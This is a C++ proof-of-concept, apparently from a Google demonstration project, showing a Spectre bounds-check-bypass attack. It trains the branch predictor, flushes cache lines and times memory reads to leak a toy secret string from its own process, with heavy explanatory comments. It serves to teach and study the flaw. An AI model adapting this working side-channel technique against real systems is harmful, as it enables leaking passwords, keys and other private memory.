/*
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

// TODO(jeanpierreda): Test on ARM.
// TODO(jeanpierreda): Make this work on GCC.
// TODO(jeanpierreda): Use a specific public Clang version, document specific CPUs.

#include <x86intrin.h>

#include <algorithm>
#include <array>
#include <chrono>
#include <cstring>
#include <iostream>
#include <memory>
#include <numeric>
#include <string>
#include <string_view>
#include <tuple>

// Objective: given some control over accesses to the *non-secret* string
// "Hello, world!", construct a program that obtains "It's a s3kr3t!!!" without
// ever accessing it in the C++ execution model, using speculative execution and
// side channel attacks
//
// It is far more convenient for the attacker if these are adjacent in memory,
// since then there is no effort needed to discover the offset for the private
// value relative to the public value.
// However, it is not strictly necessary. The secret _could_ be anywhere
// relative to the string, as long as there is some attacker-controlled value
// that could reach it during buffer overflow.
const std::string_view public_data = "Hello, world!";
const std::string_view private_data = "It's a s3kr3t!!!";

// Forces a memory read of the byte at address p. This will result in the byte
// being loaded into cache.
static void force_read(void *p) { (void)*(volatile char *)p; }

static int64_t get_timestamp() {
  return std::chrono::duration_cast<std::chrono::nanoseconds>(
             std::chrono::high_resolution_clock::now().time_since_epoch())
      .count();
}

// Returns the indices of the biggest and second-biggest values in the range.
template <typename RangeT>
static std::pair<int, int> top_two_indices(const RangeT &range) {
  std::pair<int, int> result = {0, 0};  // first biggest, second biggest
  for (int i = 0; i < range.size(); ++i) {
    if (range[i] > range[result.first]) {
      result.second = result.first;
      result.first = i;
    } else if (range[i] > range[result.second]) {
      result.second = i;
    }
  }
  return result;
}

// Leaks the byte that is physically located at &text[0] + offset, without ever
// loading it. In the abstract machine, and in the code executed by the CPU,
// this function does not load any memory except for what is in the bounds
// of `text`, and local auxiliary data.
//
// Instead, the leak is performed by accessing out-of-bounds during speculative
// execution, bypassing the bounds check by training the branch predictor to
// think that the value will be in-range.
static char leak_byte(std::string_view text, int offset) {
  // Create an array spanning at least 256 different cache lines, with
  // different cache line available for each possible byte.
  // We can use this for a timing attack: if the CPU has loaded a given cache
  // line, and the cache line it loaded was determined by secret data, we can
  // figure out the secret byte by identifying which cache line was loaded.
  // That can be done via a timing analysis.
  //
  // To do this, we create an array of 256 values, each of which do not share
  // the same cache line as any other. To eliminate false positives due
  // to prefetching, we also ensure no two values share the same page,
  // by spacing them at intervals of 4096 bytes.
  //
  // See 2.3.5.4 Data Prefetching in the Intel Optimization Reference Manual:
  //   "Data prefetching is triggered by load operations when [...]
  //    The prefetched data is within the same 4K byte page as the load
  //    instruction that triggered it."
  //
  // ARM also has this constraint on prefetching:
  //   http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.ddi0388i/CBBIAAAA.html
  //
  // Spacing of 4096 was used in the original Spectre paper as well:
  //   https://spectreattack.com/spectre.pdf
  //
  struct BigByte {
    // Explicitly initialize the array. It doesn't matter what we write; it's
    // only important that we write *something* to each page. Otherwise,
    // there's an opportunity for the range to be allocated as zero-fill-on-
    // demand (ZFOD), where all virtual pages are a read-only mapping to the
    // *same* physical page of zeros. The cache in modern Intel CPUs is
    // physically-tagged, so all of those virtual addresses would map to the
    // same cache line and we wouldn't be able to observe a timing difference
    // between accessed and unaccessed pages (modulo e.g. TLB lookups).
    std::array<unsigned char, 4096> padding_ = {};
  };
  std::array<BigByte, 257> oracle_array;
  // The first value is adjacent to other elements on the stack, so
  // we only use the other elements, which are guaranteed to be on different
  // cache lines, and even different pages, than any other value.
  BigByte* isolated_oracle = &oracle_array[1];

  const char *data = &text[0];

  // The size needs to be unloaded from cache to force speculative execution
  // to guess the result of comparison. It could be stored on the stack, >=4096
  // bytes away from any other values we use we use (which will be loaded into
  // cache). In this demo, it is more convenient to store it on the heap:
  // it is the _only) heap-allocated value in this program, and easily removed
  // from cache.
  auto size_in_heap = std::make_unique<int>(text.size());

  std::array<int64_t, 256> latencies = {};
  std::array<int, 256> scores = {};
  int best_val = 0, runner_up_val = 0;

  for (int run = 0; run < 1000; ++run) {
    // Flush out entries from the timing array. Now, if they are loaded during
    // speculative execution, that will warm the cache for that entry, which
    // can be detected later via timing analysis.
    // Note that clflush is not ordered with respect to reads, so it may be
    // necessary to place a fence here or otherwise ensure that the clflushes
    // retire before the force_read call below.
    for (int i = 0; i < 256; ++i) _mm_clflush(&isolated_oracle[i]);

    // We pick a different offset every time so that it's guaranteed that the
    // value of the in-bounds access is usually different from the secret value
    // we want to leak via out-of-bounds speculative access.
    int safe_offset = run % text.size();

    for (int i = 0; i < 10; ++i) {
      // Remove from cache so that we block on loading it from memory,
      // triggering speculative execution.
      _mm_clflush(&*size_in_heap);

      // Train the branch predictor: perform in-bounds accesses 9 times,
      // and then use the out-of-bounds offset we _actually_ care about on the
      // tenth time.
      int local_offset = ((i + 1) % 10) ? safe_offset : offset;

      if (local_offset < *size_in_heap) {
        // This branch was trained to always be taken during speculative
        // execution, so it's taken even on the tenth iteration, when the
        // condition is false!
        force_read(&isolated_oracle[data[local_offset]]);
      }
    }

    // Here's the timing side channel: find which char was loaded by measuring
    // latency. Indexing into isolated_oracle causes the relevant region of
    // memory to be loaded into cache, which makes it faster to load again than
    // it is to load entries that had not been accessed.
    // Only two offsets will have been accessed: safe_offset (which we ignore),
    // and i.
    // Note: if the character at safe_offset is the same as the character we
    // want to know at i, the data from this run will be useless, but later runs
    // will use a different safe_offset.
    for (int i = 0; i < 256; ++i) {
      // NOTE: a sufficiently smart compiler (or CPU) might pre-fetch the
      // cache lines, rendering them all equally fast. It may be necessary in
      // that case to try to confuse it by accessing the offsets in a
      // (pseudo-)random order, or some other trick.
      // On the CPUs this has been tested on, placing values 4096 bytes apart
      // is sufficient to defeat prefetching.
      void *timing_entry = &isolated_oracle[i];
      int64_t start = get_timestamp();
      force_read(timing_entry);
      latencies[i] = get_timestamp() - start;
    }
    int64_t avg_latency =
        std::accumulate(latencies.begin(), latencies.end(), 0) / 256;
    for (int i = 0; i < 256; ++i) {
      if (latencies[i] < avg_latency && i != data[safe_offset]) ++scores[i];
    }

    std::tie(best_val, runner_up_val) = top_two_indices(scores);

    // TODO(jeanpierreda): This timing algorithm is suspect (it is measuring whether
    // something is usually faster than average, rather than usually faster, or
    // faster on average.)
    if (scores[best_val] > (2 * scores[runner_up_val] + 40))
      break;
    // Otherwise: if we still don't know with high confidence, we can keep
    // accumulating timing data until we think we know the value.
  }
  return best_val;
}

int main(int argc, char** argv) {
  std::cout << "Leaking the string: ";
  std::cout.flush();
  const int private_offset = private_data.begin() - public_data.begin();
  for (int i = 0; i < private_data.size(); ++i) {
    // On at least some machines, this will print the i'th byte from
    // private_data, despite the only actually-executed memory accesses being
    // to valid bytes in public_data.
    std::cout << leak_byte(public_data, private_offset + i);
    std::cout.flush();
  }
  std::cout << "\nDone!\n";
}
